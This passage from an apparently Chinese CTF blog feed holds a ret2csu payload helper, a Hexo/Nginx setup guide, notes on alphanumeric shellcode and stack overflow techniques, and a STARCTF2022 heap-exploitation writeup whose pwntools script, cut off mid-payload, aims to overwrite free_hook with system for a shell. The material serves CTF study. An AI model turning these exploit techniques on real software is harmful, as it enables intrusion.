<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>这两段能完成对<code>rdx</code>,<code>rsi</code>,<code>edi</code>的赋值，其实主要是对<code>rdx</code>，一般有直接对寄存器<code>rsi</code>,<code>rdi</code>赋值的gadget，而对于<code>rdx</code>则无。</p>
<p>需要注意的是寄存器<code>r12</code>,<code>r13</code>的内容，由于在gadget中有指令<code>cmp rbx,rbp;jnz short loc_xxxxxx</code>与<code>call qword ptr [r12+rbx*8]</code>，意思是程序将对<code>rbx，rbp</code>的内容进行比较，不同则跳转会首部再执行一次；从<code>r12+rbx*8</code>地址保存的指令开始执行。一般我们将r13置为0，则会通过cmp检测。而r12的值可以当作一次rip来进行写入。或者可以使用<code>_fini</code>中的指令，这一块的指令对于我们的操作是无害的，内容为：<code>sub rsp,8;add rsp,8</code>，<code>_fini</code>的地址存放在<strong>dynamic</strong>部分。</p>
<p>这里我放上自己的ret2csu.sublime-snippet，方便做题使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;snippet&gt;</span><br><span class="line">	&lt;content&gt;&lt;![CDATA[</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2csu</span>(<span class="params">r12,r13,r14,r15,system=<span class="number">0</span></span>):</span></span><br><span class="line">    rbx=<span class="number">0</span></span><br><span class="line">    rbp=<span class="number">1</span></span><br><span class="line">    pop=$&#123;<span class="number">1</span>:pop&#125;</span><br><span class="line">    mov=$&#123;<span class="number">2</span>:mov&#125;</span><br><span class="line">    payload=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> system:</span><br><span class="line">        payload+=p32(pop)+p32(rbx)+p32(rbp)+p32(r12)+p32(r13)+p32(r14)+p32(r15)+p32(mov)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload+=p64(pop)+p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)+p64(mov)</span><br><span class="line">  	<span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload+=ret2csu($&#123;<span class="number">3</span>:system&#125;,$&#123;<span class="number">4</span>:rip&#125;,$&#123;<span class="number">5</span>:edi&#125;,$&#123;<span class="number">6</span>:rsi&#125;,$&#123;<span class="number">7</span>:rdx&#125;)</span><br><span class="line">]]&gt;&lt;/content&gt;</span><br><span class="line">	&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a tabTrigger to define how to trigger the snippet --&gt;</span><br><span class="line">	&lt;tabTrigger&gt;ret2csu&lt;/tabTrigger&gt;</span><br><span class="line">	&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a scope to limit where the snippet will trigger --&gt;</span><br><span class="line">	&lt;!-- &lt;scope&gt;source.python&lt;/scope&gt; --&gt;</span><br><span class="line">&lt;/snippet&gt;</span><br></pre></td></tr></table></figure>

<p>默认打包使用64位模式下的内存块大小，其中的pop指的是第二段gadget中的从<code>pop rbx</code>的地址，mov为第一段gadget的<code>mov rdx,r13</code>地址。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu使用Nginx+Hexo博客</title>
    <url>/2021/12/25/Ubuntu%E4%BD%BF%E7%94%A8Nginx-Hexo%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<p>基于hexo官方文档 <a href="https://hexo.io/zh-cn/docs/">https://hexo.io/zh-cn/docs/</a> 和网上其他博主的搭建过程，照葫芦画瓢好不容易搭好了博客，回忆了一下自己的大概操作。</p>
<span id="more"></span>

<h1 id="本地配置"><a href="#本地配置" class="headerlink" title="本地配置"></a>本地配置</h1><p>我本地使用的也是ubuntu，以下就以ubuntu为例了</p>
<h2 id="安装必要程序"><a href="#安装必要程序" class="headerlink" title="安装必要程序"></a>安装必要程序</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install git</span><br><span class="line">sudo apt install node.js</span><br><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<p>如果无法直接安装hexo可以更换npm源，以下是淘宝的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm config set registry https://registry.npm.taobao.org</span><br></pre></td></tr></table></figure>

<h2 id="配置hexo"><a href="#配置hexo" class="headerlink" title="配置hexo"></a>配置hexo</h2><p>在任意路径下创建一个文件夹，然后进行操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo init &lt;folder&gt;</span><br><span class="line">cd &lt;folder&gt;</span><br><span class="line">npm install</span><br><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>

<p>然后运行一次hexo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure>

<p>然后在本地浏览器上，访问127.0.0.1:4000。如果hexo配置成功，则会出现hexo的默认页面。</p>
<p><img src="https://s2.loli.net/2021/12/25/MXljT2zv5BIY4wG.png" alt="default.png"></p>
<p>Ctrl+C结束后，继续进行配置。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd &lt;folder&gt;</span><br><span class="line">sudo _config.yml</span><br></pre></td></tr></table></figure>

<p>在配置文件中配置deploy用于一键部署，在文件最后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@&#x27;服务器ip&#x27;:&#x27;远程仓库路径&#x27;  # 远程仓库的创建在下文</span><br><span class="line">  branch: master</span><br></pre></td></tr></table></figure>

<h1 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h1><h2 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install nginx</span><br></pre></td></tr></table></figure>

<p>启动nginx</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service nginx start</span><br></pre></td></tr></table></figure>

<p>登陆服务器访问服务器，出现nginx测试页面则代表成功</p>
<h2 id="创建git用户"><a href="#创建git用户" class="headerlink" title="创建git用户"></a>创建git用户</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">adduser git</span><br></pre></td></tr></table></figure>

<h2 id="创建远程仓库"><a href="#创建远程仓库" class="headerlink" title="创建远程仓库"></a>创建远程仓库</h2> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir /var/repo</span><br><span class="line">cd /var/repo</span><br><span class="line">sudo mkdir blog.git</span><br><span class="line">sudo chown -R git:git blog.git</span><br><span class="line">cd blog.git</span><br><span class="line">git init --bare</span><br></pre></td></tr></table></figure>

<h2 id="创建静态文件夹"><a href="#创建静态文件夹" class="headerlink" title="创建静态文件夹"></a>创建静态文件夹</h2><p>用来存放本地hexo文件夹中的public文件夹文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo mkdir /var/www/blog</span><br><span class="line">sudo chown -R git:git /var/www/blog</span><br></pre></td></tr></table></figure>

<h2 id="配置静态服务器访问路径"><a href="#配置静态服务器访问路径" class="headerlink" title="配置静态服务器访问路径"></a>配置静态服务器访问路径</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure>

<p>更改为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">server &#123;</span><br><span class="line">        listen 80 default_server;</span><br><span class="line">        listen [::]:80 default_server;</span><br><span class="line"></span><br><span class="line">        # SSL configuration</span><br><span class="line">        #</span><br><span class="line">        # listen 443 ssl default_server;</span><br><span class="line">        # listen [::]:443 ssl default_server;</span><br><span class="line">        #</span><br><span class="line">        # Note: You should disable gzip for SSL traffic.</span><br><span class="line">        # See: https://bugs.debian.org/773332</span><br><span class="line">        #</span><br><span class="line">        # Read up on ssl_ciphers to ensure a secure configuration.</span><br><span class="line">        # See: https://bugs.debian.org/765782</span><br><span class="line">        #</span><br><span class="line">        # Self signed certs generated by the ssl-cert package</span><br><span class="line">        # Don&#x27;t use them in a production server!</span><br><span class="line">        #</span><br><span class="line">        # include snippets/snakeoil.conf;</span><br><span class="line"></span><br><span class="line">        root /var/www/blog;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>然后重启nginx即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure>

<h2 id="将本地机器上的ssh公钥填入authorized-keys文件"><a href="#将本地机器上的ssh公钥填入authorized-keys文件" class="headerlink" title="将本地机器上的ssh公钥填入authorized_keys文件"></a>将本地机器上的ssh公钥填入authorized_keys文件</h2><p>因为git是新用户，所以需要先生成自己的ssh公钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">su git</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">su root</span><br></pre></td></tr></table></figure>

<p>一直回车即可，然后在本地机器上查看ssh公钥</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure>

<p>复制后粘贴在服务器指定文件中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /home/git/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>

<h2 id="配置git-hook"><a href="#配置git-hook" class="headerlink" title="配置git hook"></a>配置git hook</h2><p>进入远程仓库进行操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd hooks</span><br><span class="line">sudo vim post-receive</span><br></pre></td></tr></table></figure>

<p>填入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">  </span><br><span class="line">git --work-tree=/var/www/blog --git-dir=/var/repo/blog.git checkout -f</span><br><span class="line">#               &lt;静态文件地址&gt;        &lt;远程仓库地址&gt;</span><br></pre></td></tr></table></figure>

<p>最后赋予文件可执行权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x post-receive</span><br></pre></td></tr></table></figure>

<p>然后就可实现自动部署</p>
<p>最后，在本地打开hexo文件夹进行操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>然后浏览器访问远程服务器，如果出现hexo默认页面则代表成功。至此，搭建博客结束。</p>
]]></content>
      <tags>
        <tag>hexo</tag>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title>alphanumeric_shellcode</title>
    <url>/2022/02/08/alphanumeric-shellcode/</url>
    <content><![CDATA[<p>刷buu时做到一题限制了字符范围的题(mrctf2020_shellcode_revenge)。</p>
<span id="more"></span>

<p>需要使用alphanumeric shellcode(纯字符shellcode)。</p>
<p>就是使用纯字符对应的汇编指令完成shellcode的编写，比如：</p>
<table>
<thead>
<tr>
<th align="center">ASCII字符</th>
<th align="center">Hex</th>
<th align="center">汇编指令</th>
</tr>
</thead>
<tbody><tr>
<td align="center">P</td>
<td align="center">0x50</td>
<td align="center">push %rax</td>
</tr>
<tr>
<td align="center">Q</td>
<td align="center">0x51</td>
<td align="center">push %rcx</td>
</tr>
<tr>
<td align="center">R</td>
<td align="center">0x52</td>
<td align="center">push %rdx</td>
</tr>
<tr>
<td align="center">S</td>
<td align="center">0x53</td>
<td align="center">push %rbx</td>
</tr>
<tr>
<td align="center">T</td>
<td align="center">0x54</td>
<td align="center">push %rsp</td>
</tr>
<tr>
<td align="center">U</td>
<td align="center">0x55</td>
<td align="center">push %rbp</td>
</tr>
<tr>
<td align="center">V</td>
<td align="center">0x56</td>
<td align="center">push %rsi</td>
</tr>
<tr>
<td align="center">W</td>
<td align="center">0x57</td>
<td align="center">push %rdi</td>
</tr>
<tr>
<td align="center">X</td>
<td align="center">0x58</td>
<td align="center">pop %rax</td>
</tr>
<tr>
<td align="center">Y</td>
<td align="center">0x59</td>
<td align="center">pop %rcx</td>
</tr>
<tr>
<td align="center">Z</td>
<td align="center">0x5a</td>
<td align="center">pop %rdx</td>
</tr>
</tbody></table>
<p>我们可以使用一些工具来进行编码。</p>
<p>详情如下：<a href="http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode">http://taqini.space/2020/03/31/alpha-shellcode-gen/#alphanumeric-shellcode</a></p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>stack overflow漏洞小结</title>
    <url>/2022/03/04/stack-overflow%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<p>以<a href="https://ctf-wiki.org/pwn/linux/user-mode/environment/">CTF Wiki</a>的目录为骨架，记录自己对栈溢出漏洞的理解。</p>
<span id="more"></span>

<p>对于CTF的pwn方向而言，我们实际上要做的就是通过一些漏洞来达到干扰程序的运行流程，以达到get shell或泄露敏感文件的内容的效果。</p>
<p>在介绍stack overflow漏洞之前，我们需要对栈有一个<a href="http://blog.rabb1t.xyz/2022/03/04/%E6%A0%88%E4%BB%8B%E7%BB%8D/">基本的了解</a>。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>栈溢出指的是用户向栈中变量写入的长度超过了其本身的长度，导致其相邻栈数据被改写的情况。发生栈溢出的前提是：</p>
<ul>
<li>写入的位置在栈上</li>
<li>写入的长度没被良好的控制</li>
</ul>
<h2 id="相关危险函数"><a href="#相关危险函数" class="headerlink" title="相关危险函数"></a>相关危险函数</h2><p>通过上面提到的前提，我们知道要想利用栈溢出，则必须有用户输入的环节。包括的常见输入危险函数有：</p>
<ul>
<li> gets：从标准输入<code>stdin</code>中读取数据直到出现换行符或读到文件尾为止，最后加上NULL作为字符串结束。</li>
<li> scanf：从标准输入 <code>stdin</code> 读取格式化输入。</li>
</ul>
<p>以上函数均没有较好的限制长度，所以容易产生溢出漏洞。</p>
<p>除了输入环节，还有一些涉及到字符串赋值的环节也会产生栈溢出漏洞，包括的常见函数有：</p>
<ul>
<li> strcpy，字符串复制，遇到’\x00’停止</li>
<li> strcat，字符串拼接，遇到’\x00’停止</li>
</ul>
<p>遇到上面两个函数时，也会因为被赋值变量的长度不够而导致溢出。</p>
<h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><p>当我们找到此漏洞时，我们就可以任意改写此变量之后的任意地址中的内容。常见的利用此漏洞进行改写的地址有：</p>
<ul>
<li><code>return addrss</code>中的内容</li>
<li>栈上其他变量的值</li>
<li>若待写变量在bss段，也能更改bss段中的内容</li>
</ul>
<p>我们想要改写地址的目的无非是<strong>直接或者间接地控制程序执行流程</strong>。</p>
<p>而利用栈溢出漏洞最常见的攻击方式，就是ROP了，了解可以看看这篇<a href="http://blog.rabb1t.xyz/2022/03/04/ROP%E4%BB%8B%E7%BB%8D/">ROP介绍</a>。</p>
<h2 id="栈溢出技巧"><a href="#栈溢出技巧" class="headerlink" title="栈溢出技巧"></a>栈溢出技巧</h2><p>由于本人水平有限，仅简单介绍CTF Wiki上的花式栈溢出技巧。</p>
<h3 id="stack-pivot"><a href="#stack-pivot" class="headerlink" title="stack pivot"></a>stack pivot</h3><p>合理使用<code>jmp esp</code>或<code>pop esp</code>指令将栈顶指针跳转到指定的地址，执行<code>ret</code>指令后将从该位置执行。我们常将构造的rop chain或shellcode写入一些可写入地址，然后将栈顶迁移到这些地址或后门函数，并在此处开栈执行设计好的流程。</p>
<h3 id="frame-faking"><a href="#frame-faking" class="headerlink" title="frame faking"></a>frame faking</h3><p>构造一个虚假的栈帧来控制程序的执行流</p>
<p>我感觉其实就是栈迁移，只不过当我们没有合适的指令改变栈顶指针时，通过<code>leave;ret</code>指令的重复使用，将栈帧迁移到我们指定的地址，然后将<code>rip</code>寄存器赋值为我们构造的rop chain。</p>
<p>先在合适的地方将我们构造的rop chain或shellcode，再利用栈溢出将<strong>指令的首地址+8</strong>的指针写入栈帧部分，再将<code>leave;ret</code>指令的地址写入return address。那么加上原本程序中的<code>leave;ret</code>，我们将执行两次。执行了两次后将栈顶搬到了指定地址，最后的<code>ret</code>指令就会将写入的指令写入<code>rip</code>寄存器，接着执行你设计的执行流。</p>
<p>根据下图加深印象：</p>
<p><img src="https://s2.loli.net/2022/03/04/FftxCI8Ey3KrHpb.png" alt="5"></p>
<p>需要注意的是，当我们将栈帧迁移之后，我们写入的执行指令可能是执行另一个函数，那么就会在当前这个位置开栈。如果我们开栈的位置距离一些写有重要数据的段不远，那么函数执行时将会覆盖掉一些，可能会令程序执行不下去导致dump。</p>
<h4 id="特殊的利用方法"><a href="#特殊的利用方法" class="headerlink" title="特殊的利用方法"></a>特殊的利用方法</h4><p>这是通过一道栈迁移题目新学到的。题中有一行代码是这样写的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.text:00000000004011CB                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000004011CF                 mov     edx, 40h ; &#x27;@&#x27;  ; nbytes</span><br><span class="line">.text:00000000004011D4                 mov     rsi, rax        ; buf</span><br><span class="line">.text:00000000004011D7                 mov     edi, 0          ; fd</span><br><span class="line">.text:00000000004011DC                 mov     eax, 0</span><br><span class="line">.text:00000000004011E1                 call    _read</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>我们知道变量的地址是通过变量到栈帧的偏移计算得到的。于是我们可以通过改变<code>rbp</code>的值来利用read函数对任意地址进行改写，甚至在bss段写入一段ropchain，最后执行，如果ropchain过长，可以在bss段上反复横跳来写入。</p>
<h3 id="stack-smash"><a href="#stack-smash" class="headerlink" title="stack smash"></a>stack smash</h3><p>我们知道如果程序开启了canary保护后，我们进行栈溢出操作就会报错。stack smash就是利用改写报错内容来打印出敏感内容。</p>
<p>原理：开启了canary保护后，若发现canary被修改，程序就会执行<code>__stack_chk_fail</code>函数来打印argv[0]指针所指向的字符串，正常情况下，这个指针指向的是程序名。所以当我们利用栈溢出漏洞将argv[0]地址的内容改写为敏感信息的地址，那么就能泄露。</p>
<h3 id="栈上的-partial-overwrite"><a href="#栈上的-partial-overwrite" class="headerlink" title="栈上的 partial overwrite"></a>栈上的 partial overwrite</h3><p>内容主要是：仅改变这个地址的部分内容，一般为低位。</p>
<p>程序即使开了地址随机化保护，它的主要表现都集中在高位地址的变化，而低12位地址一般是偏移，是不会变化的，这也是我们利用低12位地址就能泄露libc版本原因。因此，我们仅需改写地址的低12位地址的偏移就能绕过PIE保护。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>STARCTF2022 pwn方向writeup</title>
    <url>/2022/04/21/starCTF-pwn%E6%96%B9%E5%90%91%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>只能做一题(待续)</p>
<span id="more"></span>

<h2 id="examination"><a href="#examination" class="headerlink" title="examination"></a>examination</h2><h3 id="检查程序"><a href="#检查程序" class="headerlink" title="检查程序"></a>检查程序</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/rabbit/Desktop/*CTF2022/examination/examination&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">    RUNPATH:  &#x27;/home/rabbit/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/&#x27;</span><br></pre></td></tr></table></figure>

<h3 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h3><p>是一个老师给学生打分、留评语的程序。</p>
<ul>
<li>老师最多添加6个学生并为其指定题数，其中添加学生会生成两个大小分别为0x30、0x20的chunk。</li>
<li>老师写评语会生成一个用户指定、有大小限制的chunk。</li>
<li>对review的索引依赖学生两个chunk中的指定内容。</li>
<li>write_review的读写长度，依赖0x20大小chunk的中最后一个内存块的内容。</li>
<li>在student的check_review，会检查学生的成绩是否及格(score&gt;59)，及格则泄露地址，并可以给任意一个地址内容+1。</li>
</ul>
<h4 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h4><ul>
<li><p><strong>整数溢出</strong><br>student的pray功能会给对应的学生打上一个标记，而老师give_score时，检测到该标记位则会给学生-10分。因为在check_review中，检测时将该位看作了DWORD(一般是无符号)，因此当学生分数小于10则会产生一个整数溢出漏洞，从而通过检测。</p>
</li>
<li><p><strong>堆溢出</strong><br>由于write_review依赖于chunk中的指定内容，若我们能控制该chunk中的内容，则能够产生一个堆溢出漏洞。</p>
</li>
<li><p><strong>off-by-one</strong><br>由于check_review能增加内容大小，因此增大review读写大小能产生一个off-by-null漏洞。</p>
</li>
</ul>
<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>利用整数溢出漏洞通过check_review的检测，泄露堆地址并制造一个off-by-one漏洞。构造堆重叠，并且重叠覆盖下一个学生对应的两个chunk，释放掉该chunk后，能将review大小覆盖为更大的值，制造堆溢出漏洞。</p>
<p>由于能改变review读写大小，因此还能够通过释放掉非fast chunk来泄露libc地址。并且由于glibc版本为2.31，具有tcache机制，因此为了将chunk放入unsortedbin中需要比tcache范围大。</p>
<p>再利用堆溢出修改chunk中的内容以修改free_hook中的内容为system。然后将review地址改为’/bin/sh’地址，或将该地址赋值为’/bin/sh’，然后释放掉就能get shell。</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># io=process(&#x27;./examination&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;124.70.130.92&#x27;</span>,<span class="number">60001</span>)</span><br><span class="line"></span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./examination&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">&quot;choice&gt;&gt; &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line">role=<span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">&quot;role: &lt;0.teacher/1.student&gt;: &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_student</span>(<span class="params">index</span>):</span></span><br><span class="line">    role(<span class="number">0</span>)</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;enter the number of questions: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_score</span>():</span></span><br><span class="line">    role(<span class="number">0</span>)</span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_test</span>():</span></span><br><span class="line">    role(<span class="number">1</span>)</span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_review</span>(<span class="params">index,comment,size=<span class="number">0</span></span>):</span></span><br><span class="line">    role(<span class="number">0</span>)</span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;which one? &gt; &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span> size:</span><br><span class="line">        sla(<span class="string">&quot;please input the size of comment: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;enter your comment:&quot;</span>,comment)</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_parent</span>(<span class="params">index</span>):</span></span><br><span class="line">    role(<span class="number">0</span>)</span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;which student id to choose?&quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pray</span>():</span></span><br><span class="line">    role(<span class="number">1</span>)</span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_review</span>():</span></span><br><span class="line">    role(<span class="number">1</span>)</span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;reward! &#x27;</span>)</span><br><span class="line">    content=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_id</span>(<span class="params">index</span>):</span></span><br><span class="line">    role(<span class="number">1</span>)</span><br><span class="line">    choose(<span class="number">6</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;input your id: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#0</span></span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line">write_review(<span class="number">0</span>,<span class="string">&#x27;rabbit&#x27;</span>,<span class="number">0x18</span>)</span><br><span class="line">write_review(<span class="number">1</span>,<span class="string">&#x27;rabbit&#x27;</span>,<span class="number">0x3f0</span>)</span><br><span class="line"></span><br><span class="line">change_id(<span class="number">0</span>)</span><br><span class="line">pray()</span><br><span class="line"></span><br><span class="line">give_score()</span><br><span class="line"></span><br><span class="line">heap=check_review()-<span class="number">0x2a0</span></span><br><span class="line">sla(<span class="string">&quot;add 1 to wherever you want! addr: &quot;</span>,<span class="built_in">str</span>((heap+<span class="number">0x2e0</span>)*<span class="number">10</span>))</span><br><span class="line">choose(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">write_review(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;\x51&#x27;</span>)</span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#2</span></span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#3</span></span><br><span class="line">write_review(<span class="number">2</span>,<span class="string">&#x27;rabbit&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#4</span></span><br><span class="line">write_review(<span class="number">4</span>,<span class="string">&#x27;rabbit&#x27;</span>,<span class="number">0x3f0</span>)</span><br><span class="line"></span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#5</span></span><br><span class="line">write_review(<span class="number">5</span>,<span class="string">&#x27;rabbit&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line">add_student(<span class="number">1</span>)  <span class="comment">#6</span></span><br><span class="line">write_review(<span class="number">6</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>,<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">call_parent(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span 